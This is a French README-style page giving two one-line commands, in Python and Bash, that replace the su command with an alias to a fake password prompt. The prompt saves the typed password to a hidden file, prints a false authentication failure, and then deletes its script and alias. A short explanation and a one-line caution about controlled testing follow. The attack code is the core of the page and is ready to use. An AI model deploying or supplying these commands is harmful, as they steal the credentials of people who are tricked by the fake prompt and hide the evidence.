# Python
```
echo -e "import getpass\npassword = getpass.getpass('Password: ')\nprint('su: Authentication failure')\ntxt = open('.HAHAHA','w')\ntxt.writelines(password)" > hihihi.py ; alias su="python hihihi.py ; shred -n10 hihihi.py ; rm -f hihihi.py ; unalias su "
```
# Bash
Ajoutez '$' avant le second 'OOO'
```
echo -e "\nread -p 'Password: ' -s OOO \necho OOO >.HAHAHA \necho '' \necho 'su: Authentication failure'" >hohoho.sh ; alias su="bash hohoho.sh ; rm -f hohoho.sh ; unalias su "
```

## ! Gardez à l'esprit que si vous effectuez des tests de sécurité, il est recommandé de le faire dans un environnement de test contrôlé et de travailler en étroite collaboration avec les propriétaires et les administrateurs du système pour éviter toute confusion ou toute interprétation erronée de vos actions. !


# Explication

* Langage de Programmation:
  * Le premier code utilise __Python__ en tant que langage de programmation pour exécuter les actions.
  * Le deuxième code utilise le __shell (bash)__ comme langage de script pour exécuter les actions.

* Capture de Mot de Passe:
  * Le premier code utilise le module Python __getpass__ pour capturer un mot de passe de manière sécurisée.
  * Le deuxième code utilise la commande shell __read__ pour capturer un mot de passe de manière sécurisée.

* Fichier de Sortie:
  * Le premier code écrit le mot de passe dans un fichier .HAHAHA en utilisant Python.
  * Le deuxième code écrit le mot de passe dans un fichier .HAHAHA en utilisant des commandes shell.

* Affichage du Message d'Échec:
  * Les deux codes affichent le message "su: Authentication failure" pour simuler un échec d'authentification.

* Alias pour la Commande su:
  * Les deux codes créent un alias pour la commande su qui exécute le script correspondant.
  * Le premier code exécute le script Python hihihi.py.
  * Le deuxième code exécute le script shell hohoho.sh.

* Suppression Sécurisée:
  * Les deux codes utilisent des commandes pour supprimer les fichiers créés après exécution.
  * Le premier code utilise les commandes shred et rm pour supprimer le fichier Python.
  * Le deuxième code utilise la commande rm pour supprimer le fichier shell.
